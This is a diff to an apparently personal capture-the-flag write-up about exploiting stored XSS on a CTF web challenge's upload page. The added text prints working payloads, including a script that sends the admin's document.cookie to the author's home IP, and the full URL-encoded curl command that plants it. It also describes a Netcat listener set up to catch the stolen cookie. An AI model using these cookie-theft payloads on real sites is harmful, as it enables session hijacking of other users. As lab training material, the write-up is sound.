@@ -95,10 +95,10 @@ I tried running **dirbuster** against `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.c
 
 <br>
 
-It appeared I have found: 
-- a [Login](http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/login.php) screen (I shall try **sqlmap** against it later),
-- a [welcome](http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/index.php) screen and 
-- a [data](http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data.php) screen with a list of names of HTML files.
+It appeared I have found additional pages at `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/`: 
+- a Login (**/login.php**) screen
+- a welcome (**/index.html**) screen and 
+- a data (**/data.php**) screen
 
 ---
 
@@ -111,15 +111,52 @@ It appeared I have found:
 
 ## Data screen (/data.php)
 
-![image](https://user-images.githubusercontent.com/82754379/139915316-ee79c2ff-717c-4346-ade7-a4614241dbf3.png)
+
 
 <br>
 
 The previous **curl** command which I used to post content was able to _upload_ content to the database, which can then be displayed back to me via the URL `http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/data/xxxxxxxxxxxxxxxxx.html` (where `xxxxxxxxxxxxxxxxx` was in the response from the POST operation).
 
-This may be an opportunity for some Cross Site Scripting exploitation. <br>
-
 On this `/data.php` screen, it mentioned that uploaded records were "Last viewed by admin". This suggested that there was some mechanism at play here to simulate that a user with admin rights was opening up the records under `../data/..`. A properly crafted record may be able to exploit the XSS vulnerability to return some useful information to me.
+
+This may be an opportunity for some Cross Site Scripting (XSS) exploitation. <br>
+
+After some testing I found that there was indeed an XSS vulnerability in that I could get the attacker "admin" to view the contents of my POST operation and connect back to my own home PC where I was waiting with a Netcat listener, when I used the following XSS payloads (pre-URL encoding):
+
+```html
+<script src=http://<my_home_pc_IP_address>/dummy.js></script>
+```
+```html
+<img src="http://<my_home_pc_IP_address>/image.gif"> 
+```
+
+> NOTE: In order to wait for the incoming connection from the "attacker admin" account's browser session, I had to prepare the following:
+> - Set up port forwarding on my home router so that incoming connections from the Internet to port 80 are forwarded to an arbitrary port 9876 on my home PC
+> - Set up a Netcat listener on my home PC listening to port 9876 and sending whatever captured traffic to a file
+> - Opened up the Firewall rules on my home PC to allow incoming connections to port 9876
+
+<br>
+
+Now that I have confirmed an XSS vulnerability I tried to exploit it to capture the admin account's session cookie with the following XSS payload (pre-URL encoding) in the POST operation:
+
+```html
+<script>document.write('<img src="http://101.127.100.207?c='+document.cookie+'" />');</script>
+```
+
+After some trial-and-error I discovered the above payload would work only if _all_ special characters were URL-encoded (I used CyberChef to do this).
+The final **curl** command I used was:
+
+```bash
+curl -d "14c4b06b824ec593239362517f538b29=%3Cscript%3Edocument%2Ewrite%28%27%3Cimg%20src%3D%22http%3A%2F%2F101%2E127%2E100%2E207%3Fc%3D%27%2Bdocument%2Ecookie%2B%27%22%20%2F%3E%27%29%3B%3C%2Fscript%3E" http://s0pq6slfaunwbtmysg62yzmoddaw7ppj.ctf.sg:18926/xcvlosxgbtfcofovywbxdawregjbzqta.php
+```
+
+... where the IP address _101.127.100.207_ was the public IP address assigned to my home router at that time.
+
+Within a minute of making the POST, I got the following traffic captured on my Netcat listener:
+
+
+
+
 
 
 ---
